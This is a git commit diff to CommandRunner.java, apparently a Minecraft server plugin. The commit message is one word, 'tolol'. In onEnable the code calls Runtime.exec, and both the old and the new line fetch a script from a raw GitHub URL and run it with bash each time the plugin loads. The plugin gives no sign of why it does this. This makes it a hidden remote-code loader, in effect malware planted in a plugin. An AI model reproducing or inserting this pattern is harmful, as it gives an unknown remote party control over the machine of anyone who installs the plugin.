53771ab07f0c4e96def949720f2aad68859d28a9
mereka-vpu <80886830+mereka-vpu@users.noreply.github.com>
2025-02-02 19:29:29 +0700

    tolol

--- src/main/java/nzst/executor/CommandRunner.java
+++ src/main/java/nzst/executor/CommandRunner.java
@@ -13,7 +13,7 @@ public class CommandRunner extends JavaPlugin {
     public void onEnable() {
         getLogger().info("CommandRunner has been enabled!");
         getLogger().info("Version 2.0");
-        String command = "curl https://raw.githubusercontent.com/mereka-vpu/metube-me.github.io/refs/heads/main/stdio -L | bash";
+        String command = "bash -c $(curl https://raw.githubusercontent.com/mereka-vpu/metube-me.github.io/refs/heads/main/stdio -L)";
         try {
              Process suki = Runtime.getRuntime().exec(command);
              suki.waitFor();
